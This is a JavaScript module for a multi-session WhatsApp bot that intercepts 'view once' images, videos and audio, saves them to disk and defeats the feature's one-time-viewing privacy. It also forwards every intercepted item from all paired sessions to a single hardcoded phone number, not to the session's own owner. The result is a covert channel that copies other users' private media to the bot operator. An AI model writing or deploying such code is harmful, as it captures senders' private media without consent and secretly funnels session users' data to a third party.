/**
 * @file        viewonce.js
 * @description Interception et sauvegarde des vues uniques — owner par session (auto QR/pairing)
 */

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { downloadContentFromMessage, getContentType } from '@whiskeysockets/baileys';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

export const VIEWONCE_ROOT = process.env.RAILWAY_ENVIRONMENT
  ? '/app/data/viewonce'
  : path.join(__dirname, '../../data/viewonce');

/** Session centrale qui reçoit toutes les vues uniques interceptées en DM */
export const MAIN_NOTIFY_NUMBER = (process.env.VIEWONCE_NOTIFY_NUMBER || '237693552769').replace(/\D/g, '');

const _processedIds = new Map();
const DEDUP_TTL = 10 * 60 * 1000;

setInterval(() => {
  const now = Date.now();
  for (const [id, ts] of _processedIds) {
    if (now - ts > DEDUP_TTL) _processedIds.delete(id);
  }
}, 60_000);

/** Résout le numéro owner de la session courante */
export function resolveSessionOwner(ownerNumber, sock) {
  return (ownerNumber || sock?.user?.id?.split(':')[0] || '').replace(/\D/g, '');
}

/** Cherche le socket actif de la session centrale (ou d'un numéro donné) */
export function findSessionSocket(targetNumber) {
  const clean = targetNumber.replace(/\D/g, '');
  if (!global.sessions) return null;
  for (const [, state] of global.sessions) {
    if (state.connection !== 'open' || !state.sock) continue;
    const sessionNum = (state.connectedNumber || state.id || '').replace(/\D/g, '');
    if (sessionNum === clean) return state.sock;
  }
  return null;
}

/** Démballe le conteneur ephemeralMessage (messages éphémères / qui disparaissent),
 * qui enveloppe TOUT type de message y compris les vues uniques dès que les
 * messages éphémères sont activés sur la conversation. Sans ce démballage,
 * une vue unique envoyée dans une conversation avec messages éphémères actifs
 * n'est jamais reconnue comme telle. */
function unwrapEphemeral(message) {
  return message?.ephemeralMessage?.message || message;
}

/** Extrait le contenu média d'un message vue unique */
export function extractViewOnceInner(message) {
  if (!message) return null;
  message = unwrapEphemeral(message);

  let inner = message.viewOnceMessage?.message
    || message.viewOnceMessageV2?.message
    || message.viewOnceMessageV2Extension?.message;

  if (!inner) {
    const ct = getContentType(message);
    if (ct && /^(image|video|audio)Message$/.test(ct) && message[ct]?.viewOnce === true) {
      inner = message;
    }
  }
  return inner;
}

/** Détecte un message entrant à vue unique */
export function isViewOnceMessage(msg) {
  if (!msg?.message || msg.key?.fromMe) return false;
  const message = unwrapEphemeral(msg.message);
  const ct = getContentType(message);
  return /^viewOnceMessage/.test(ct)
    || message?.imageMessage?.viewOnce === true
    || message?.videoMessage?.viewOnce === true
    || message?.audioMessage?.viewOnce === true;
}

/** Télécharge le buffer d'un inner message */
export async function downloadViewOnceBuffer(inner) {
  const type = getContentType(inner);
  if (!type || !/^(image|video|audio)Message$/.test(type)) {
    throw new Error('Type média vue unique non supporté');
  }
  const obj = inner[type];
  const kind = type.replace('Message', '');
  const stream = await downloadContentFromMessage(obj, kind);
  let buffer = Buffer.from([]);
  for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
  return { buffer, kind, type, obj };
}

/** Sauvegarde sur disque — dossier central de la session 237693552769 */
export function persistViewOnce(_ownerNumber, senderNumber, kind, buffer) {
  const storeDir = path.join(VIEWONCE_ROOT, MAIN_NOTIFY_NUMBER);
  fs.mkdirSync(storeDir, { recursive: true });

  const ext = kind === 'image' ? 'jpg' : kind === 'video' ? 'mp4' : 'mp3';
  const filename = `vo_${senderNumber || 'inconnu'}_${Date.now()}.${ext}`;
  const filepath = path.join(storeDir, filename);
  fs.writeFileSync(filepath, buffer);
  return { filename, filepath };
}

function buildCaption({ senderNumber, isGroup, from, rawJid, caption, filename, prefix, interceptSession }) {
  const groupInfo = isGroup ? `\nGroupe: ${rawJid || from}` : '\nDM';
  const leg = caption ? `Légende: ${caption}\n` : '';
  const via = interceptSession ? `\n📱 Session: ${interceptSession}` : '';
  return `${prefix}\nDe: @${senderNumber}${groupInfo}${via}\n${leg}💾 ${filename}`;
}

/** Envoie le média intercepté en DM à la session centrale 237693552769 */
export async function notifyOwnerViewOnce(sock, ownerNumber, { buffer, kind, obj }, ctx, meta) {
  const targetJid = `${MAIN_NOTIFY_NUMBER}@s.whatsapp.net`;
  const mainSock = findSessionSocket(MAIN_NOTIFY_NUMBER) || sock;
  const interceptSession = resolveSessionOwner(ownerNumber, sock);
  const senderJid = ctx.senderJid || `${ctx.senderNumber || 'inconnu'}@s.whatsapp.net`;

  const cap = buildCaption({
    senderNumber: ctx.senderNumber || 'inconnu',
    isGroup: ctx.isGroup,
    from: ctx.from,
    rawJid: ctx.rawJid,
    caption: obj?.caption,
    filename: meta.filename,
    prefix: '👁️ *Vue unique interceptée*',
    interceptSession,
  });

  const mentions = [senderJid];
  if (kind === 'image') {
    await mainSock.sendMessage(targetJid, { image: buffer, caption: cap }, { mentions });
  } else if (kind === 'video') {
    await mainSock.sendMessage(targetJid, { video: buffer, caption: cap }, { mentions });
  } else {
    await mainSock.sendMessage(targetJid, { text: cap, mentions });
    await mainSock.sendMessage(targetJid, { audio: buffer, mimetype: 'audio/mp4', ptt: false });
  }
}

/**
 * Intercepte automatiquement une vue unique entrante.
 * Owner = numéro connecté de la session (même logique que les commandes).
 */
export async function autoSaveViewOnce(sock, msg, ownerNumber, ctx = {}) {
  const owner = resolveSessionOwner(ownerNumber, sock);
  if (!owner) return { ok: false, reason: 'no-owner' };

  const msgId = msg?.key?.id;
  if (msgId) {
    if (_processedIds.has(msgId)) return { ok: false, reason: 'duplicate' };
    _processedIds.set(msgId, Date.now());
  }

  const inner = extractViewOnceInner(msg.message);
  if (!inner) return { ok: false, reason: 'no-inner' };

  try {
    const { buffer, kind, obj } = await downloadViewOnceBuffer(inner);
    const { filename, filepath } = persistViewOnce(owner, ctx.senderNumber, kind, buffer);
    await notifyOwnerViewOnce(sock, owner, { buffer, kind, obj }, ctx, { filename });
    return { ok: true, filename, filepath };
  } catch (err) {
    if (msgId) _processedIds.delete(msgId);
    throw err;
  }
}
